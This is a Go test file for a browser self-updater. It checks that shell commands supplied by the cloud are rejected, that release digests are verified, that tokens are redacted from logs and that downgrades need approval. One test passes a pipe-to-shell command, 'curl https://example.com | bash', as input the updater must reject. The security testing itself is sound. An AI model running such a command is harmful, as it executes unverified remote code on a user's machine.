package browser

import (
	"context"
	"strings"
	"testing"
)

type fakeUpdateRunner struct {
	calls int
}

func (f *fakeUpdateRunner) RunBrowserUpdate(ctx context.Context, req BrowserUpdateRequest) error {
	f.calls++
	return nil
}

func TestBrowserUpdaterRejectsCloudProvidedShell(t *testing.T) {
	updater := BrowserUpdater{}
	err := updater.Run(context.Background(), BrowserUpdateRequest{
		Command: "curl https://example.com | bash",
	})
	if err == nil || !strings.Contains(err.Error(), "cloud-provided commands are not allowed") {
		t.Fatalf("err = %v", err)
	}
}

func TestBrowserUpdaterRequiresDigest(t *testing.T) {
	updater := BrowserUpdater{Runner: &fakeUpdateRunner{}}
	err := updater.Run(context.Background(), BrowserUpdateRequest{
		Version: "v0.1.22",
		Source:  "https://github.com/gsd-build/browser/releases/download/v0.1.22/gsd-browser",
	})
	if err == nil || !strings.Contains(err.Error(), "digest is required") {
		t.Fatalf("err = %v", err)
	}
}

func TestBrowserUpdaterVerifiesDigestAndAllowlist(t *testing.T) {
	runner := &fakeUpdateRunner{}
	updater := BrowserUpdater{
		Runner: runner,
		Fetch: func(ctx context.Context, source string) ([]byte, error) {
			return []byte("binary"), nil
		},
	}
	err := updater.Run(context.Background(), BrowserUpdateRequest{
		Version:     "v0.1.22",
		Source:      "https://github.com/gsd-build/browser/releases/download/v0.1.22/gsd-browser",
		Digest:      browserDigest([]byte("binary")),
		SignatureOK: true,
	})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if runner.calls != 1 {
		t.Fatalf("runner calls = %d, want 1", runner.calls)
	}
}

func TestBrowserUpdaterRejectsDigestMismatch(t *testing.T) {
	updater := BrowserUpdater{
		Fetch: func(ctx context.Context, source string) ([]byte, error) {
			return []byte("binary"), nil
		},
	}
	err := updater.Run(context.Background(), BrowserUpdateRequest{
		Version:     "v0.1.22",
		Source:      "https://github.com/gsd-build/browser/releases/download/v0.1.22/gsd-browser",
		Digest:      browserDigest([]byte("other")),
		SignatureOK: true,
	})
	if err == nil || !strings.Contains(err.Error(), "digest mismatch") {
		t.Fatalf("err = %v", err)
	}
}

func TestBrowserUpdaterRequiresFetcherForDigestVerification(t *testing.T) {
	updater := BrowserUpdater{Runner: &fakeUpdateRunner{}}
	err := updater.Run(context.Background(), BrowserUpdateRequest{
		Version:     "v0.1.22",
		Source:      "https://github.com/gsd-build/browser/releases/download/v0.1.22/gsd-browser",
		Digest:      browserDigest([]byte("binary")),
		SignatureOK: true,
	})
	if err == nil || !strings.Contains(err.Error(), "fetch is required for digest verification") {
		t.Fatalf("err = %v", err)
	}
}

func TestRedactBrowserUpdateLogMasksWholeSecrets(t *testing.T) {
	got := RedactBrowserUpdateLog("https://example.com/update?token=abc123&approvalToken=approval_abcdef123456")
	if strings.Contains(got, "abc123") || strings.Contains(got, "abcdef123456") {
		t.Fatalf("redacted log leaked secret: %s", got)
	}
}

func TestBrowserUpdaterRejectsUnapprovedDowngrade(t *testing.T) {
	err := (BrowserUpdater{}).Run(context.Background(), BrowserUpdateRequest{
		Version:        "v0.1.20",
		CurrentVersion: "v0.1.22",
		Source:         "https://github.com/gsd-build/browser/releases/download/v0.1.20/gsd-browser",
		Digest:         browserDigest([]byte("binary")),
		SignatureOK:    true,
	})
	if err == nil || !strings.Contains(err.Error(), "downgrade requires rollback approval") {
		t.Fatalf("err = %v", err)
	}
}
